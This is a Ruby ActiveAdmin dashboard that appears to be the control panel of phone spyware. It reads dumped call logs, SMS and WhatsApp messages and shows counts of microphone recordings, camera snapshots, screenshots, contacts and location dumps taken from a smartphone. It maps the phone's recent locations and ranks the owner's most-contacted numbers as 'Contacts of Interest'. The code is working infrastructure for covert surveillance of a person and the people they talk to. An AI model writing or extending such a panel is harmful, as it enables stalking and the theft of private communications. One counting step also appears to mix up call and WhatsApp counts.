ActiveAdmin.register_page "Dashboard" do
    menu priority: 1, label: "Dashboard"

  content title: proc { I18n.t("active_admin.dashboard") } do

    class Activity
        attr_reader :type
        attr_reader :date
      
          def initialize(type,date)
          @type=type
          @date=date
          end
      end

    objects=Picture.all + CallLog.all + Contact.all + GeoLocation.all + Recording.all + Screenshot.all + SmsMessage.all
    activities=[]
    objects.each do |object|
        activities << Activity.new(object.class.to_s, object.date.to_s)
    end


    activities = activities.sort_by(&:date).reverse!.take(10)


    def generateClipPath(callsCount,smsCount,whatsappCount)
        totalCount=callsCount + smsCount + whatsappCount
        callsPercentage=callsCount * 100 / totalCount
        smsPercentage= smsCount * 100 / totalCount
        whatsappPercentage= whatsappCount * 100 / totalCount

        innerPolygon="polygon(50% #{ 69 - callsPercentage * 0.65}%, #{23 - smsPercentage * 0.23}% #{82 + smsPercentage * 0.15}%, #{77 + whatsappPercentage * 0.2}% #{82 + whatsappPercentage * 0.15}%)"
        outerPolygon="polygon(50% #{66 - callsPercentage * 0.62}%, #{20 - smsPercentage * 0.2}% #{85 + smsPercentage * 0.15}%, #{80 + whatsappPercentage * 0.2}% #{85 + whatsappPercentage * 0.15}%)"
        return [innerPolygon,outerPolygon]
    end


contactsOfInterest = {}

callsFile=Dir["app/assets/images/files/calllogs_dumps/*.txt"].sort { |a,b| File.mtime(a) <=> File.mtime(b) }.last
smsFile=Dir["app/assets/images/files/sms_messages_dumps/*.txt"].sort { |a,b| File.mtime(a) <=> File.mtime(b) }.last
whatsAppFile=Dir["app/assets/images/files/whatsapp/*.txt"].sort { |a,b| File.mtime(a) <=> File.mtime(b) }.last

callsLines=File.readlines(callsFile).filter { |line| line =~ /^Number\s:/ }
calls=callsLines.map { |line| line.split(":")[1].strip }
callNumbers = Hash.new(0)
calls.each { |number| callNumbers[number] += 1 }
callsMaxCount=callNumbers.filter{ |k,v| !(contactsOfInterest.key? k) }.values.sort.reverse[0]

smsMessagesLines=File.readlines(smsFile).filter { |line| line =~ /^Address\t:/ }
smsMessages=smsMessagesLines.map { |line| line.split(":")[1].strip }
smsNumbers = Hash.new(0)
smsMessages.each { |number| smsNumbers[number] += 1 }
smsMaxCount=smsNumbers.filter{ |k,v| !(contactsOfInterest.key? k) }.values.sort.reverse[0]

whatsappMessagesLines=File.readlines(whatsAppFile   ).filter { |line| ! (line =~ /------/) && line =~ /@s.whatsapp.net---/ }
whatsappMessages=whatsappMessagesLines.map { |line| line.split("---")[1].strip.slice(1,10) }
whatsappNumbers = Hash.new(0)
whatsappMessages.each { |number| whatsappNumbers[number] += 1 }
whatsappMaxCount=whatsappNumbers.filter{ |k,v| !(contactsOfInterest.key? k) }.values.sort.reverse[0]

contactsOfInterest.merge!  [callNumbers.detect {|k,v| callNumbers[k] == callsMaxCount }].to_h \
                                      .map { |k,v| [k, :whatsapp_count => whatsappNumbers.key?(k) ? whatsappNumbers[k] : 0,
                                                       :calls_count => v,
                                                       :sms_count => smsNumbers.key?(k) ? smsNumbers[k] : 0 ]}.to_h


contactsOfInterest.merge!  [smsNumbers.detect {|k,v| smsNumbers[k] == smsMaxCount }].to_h \
                                      .map { |k,v| [k, :whatsapp_count => callNumbers.key?(k) ? callNumbers[k] : 0,
                                                       :calls_count => callNumbers.key?(k) ? callNumbers[k] : 0,
                                                       :sms_count => v ]}.to_h


contactsOfInterest.merge!  [whatsappNumbers.detect {|k,v| whatsappNumbers[k] == whatsappMaxCount }].to_h \
                                          .map { |k,v| [k, :whatsapp_count => v,
                                                           :calls_count => callNumbers.key?(k) ? callNumbers[k] : 0,
                                                           :sms_count => smsNumbers.key?(k) ? smsNumbers[k] : 0 ]}.to_h

contacts=[{"contact"=>"Unknown", "polygons"=>["polygon(50% 4.0%, 23.0% 82.0%, 77.0% 82.0%)", "polygon(50% 4.0%, 20.0% 85.0%, 80.0% 85.0%)"]},
          {"contact"=>"Unknown", "polygons"=>["polygon(50% 69.0%, 0.0% 97.0%, 77.0% 82.0%)", "polygon(50% 66.0%, 0.0% 100.0%, 80.0% 85.0%)"]},
          {"contact"=>"Unknown", "polygons"=>["polygon(50% 69.0%, 23.0% 82.0%, 97.0% 97.0%)", "polygon(50% 66.0%, 20.0% 85.0%, 100.0% 100.0%)"]}]
@contacts=[]
contactsOfInterest.each { |k,v| @contacts.append({ "contact" => k, "polygons" => generateClipPath(v[:calls_count],v[:sms_count],v[:whatsapp_count]) })}
puts contactsOfInterest
puts @contacts
    def getContactsOfInterest

    end










    


    columns do
                column span: 3 do
                    columns do
                  column  do 

                      render partial: "calls_count", locals: {name: "CALL DUMPS", count: CallLog.all.size}
                  end
                

                  column do

                      render partial: "messages_count", locals: {name: "SMS DUMPS ", count: SmsMessage.all.size}
                  end
                


                  column do

                      render partial: "screenshots_count", locals: {name: "SCREEN SNAPS", count: Screenshot.all.size}
                end
                

                column do
            
                    render partial: "contacts_count", locals: {name: "CONTACTS DUMPS", count: Contact.all.size}
            end
        end
    end

    column do
        panel "Activities" do

            tabs do
                tab :Timeline do
                    render partial: "timeline",    locals: {activities: activities}
                    render partial: "triangle_info", locals: {color: "orange"}

                    
                end
                tab :Charts do
                end
            end

        end

      end
    end





  
        
                








        columns do
            column span: 3 do
                columns do

                    column do
                
                        render partial: "recordings_count", locals: {name: "MICROPHONE RECS", count: Recording.all.size}
                end
                    
    
                column do
                
                    render partial: "pictures_count", locals: {name: "CAMERA SNAPS", count: Picture.all.size}
            end
                    
    
            column do
                
                render partial: "videos_count", locals: {name: "WHATSAPP DUMPS", count: MessagingAppsDump.all.size}
        end
                    
    
        column do
            
            render partial: "locations_count", locals: {name: "LOCATION DUMPS", count: GeoLocation.all.size}
      end
    end
end
column do
end
    end


    columns do
        column span: 2 do
            panel "Locations" do
                        render partial: "map", locals: {locations: GeoLocation.all.sort_by(&:date).reverse!.take(5)}
                end

        end
        column do
            panel "Contacts of Interest" do
                render partial: "radar_chart", locals: { contacts: @contacts }
                render partial: "triangle_info", locals: {color: "orange"}

            end
        end

        column do
            
        end

    end



        #columns do
 
                #     column do
                #     panel "Recent Pictures" do
                #         table_for Picture.order("id desc").limit(10) do
                #           column("id") { |picture| status_tag(picture.id) }
                #           column("date") { |picture| picture.date }
                #           column("filename")   { |picture| picture.filename }
                #         end
                #       end
                #   end
                #   column do
                #   end
                # end


    #render partial: "switch"
    #render partial : "smartphones/dropdown_smartphones", smartphones: Smartphone.all, smartphone: Smartphone.first

    if params[:selected_smartphone_id].present?
        #render template: "smartphones/dropdown_list_smartphones", locals: {smartphones: Smartphone.all, smartphone: Smartphone.find(params[:selected_smartphone_id])}
        puts 'true'
    else
        #render template: "smartphones/dropdown_list_smartphones", locals: {smartphones: Smartphone.all, smartphone: Smartphone.first}
        puts 'false'
    end
    

    #  div class: "blank_slate_container", id: "dashboard_default_message" do
    #   span class: "blank_slate" do
    #     span I18n.t("active_admin.dashboard_welcome.welcome")
    #     small I18n.t("active_admin.dashboard_welcome.call_to_action")
    #   end
    #  end






    





  end # content
end
